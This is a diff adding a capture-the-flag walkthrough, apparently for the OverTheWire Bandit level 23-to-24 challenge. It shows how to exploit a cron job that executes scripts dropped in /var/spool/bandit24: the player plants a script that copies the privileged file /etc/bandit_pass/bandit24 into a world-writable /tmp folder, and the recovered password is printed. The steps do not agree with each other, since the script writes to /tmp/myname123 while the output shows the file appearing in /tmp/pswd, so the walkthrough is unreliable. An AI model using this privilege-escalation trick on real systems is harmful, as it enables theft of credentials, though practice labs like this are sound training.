@@ -116,10 +116,43 @@ do
     fi
 done
 ````
-- myname = bandit24
-- 
+From this script, we know that every file in the /var/spool/$myname path will be executed once and deleted after 60 seconds. and according to the previous levels, we know that we can create a directory under /tmp to perform our activities. Therefore, we will exploit this to create our own script to fetch the password from /etc/bandit_pass/bandit24 and store it in another temporary file. 
 
+We don't have permissions to read the password directly, so we use this method.. because user 24 is the one who controls the given script so he can execute the file where the password is "/etc/ bandit_pass/bandit24".
+We therefore need to write a script that allows us to execute the required file and convert its output into a new file in the /tmp directory, to be able to find our password. The most important thing now is to make good use of permissions. let's try 
+````
+bandit23@bandit:~$ mkdir /tmp/pswd
+bandit23@bandit:~$ chmod 777 /tmp/pswd
+bandit23@bandit:~$ cd /tmp/pswd
+bandit23@bandit:/tmp/pswd$ vim pswd.sh
+````
+After preparing the environement we can now creat our script
+````
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/myname123/bandit24password
+````
+let's copy our script to /var/spool/bandit24/ and wait few moment to find our password file and read it
 
+````
+bandit23@bandit:/tmp/pswd$ chmod 777 pswd.sh
+bandit23@bandit:/tmp/pswd$ cp pswd.sh /var/spool/bandit24/
+bandit23@bandit:/tmp/pswd$ ls
+password  pswd.sh
+bandit23@bandit:/tmp/pswd$ cat password
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+````
 ## Solution 
-
+````
+bandit23@bandit:~$ mkdir /tmp/pswd
+bandit23@bandit:~$ chmod 777 /tmp/pswd
+bandit23@bandit:~$ cd /tmp/pswd
+bandit23@bandit:/tmp/pswd$ vim pswd.sh
+bandit23@bandit:/tmp/pswd$ chmod 777 pswd.sh
+bandit23@bandit:/tmp/pswd$ cp pswd.sh /var/spool/bandit24/
+bandit23@bandit:/tmp/pswd$ ls
+password  pswd.sh
+bandit23@bandit:/tmp/pswd$ cat password
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+````
+we got it *-*
 
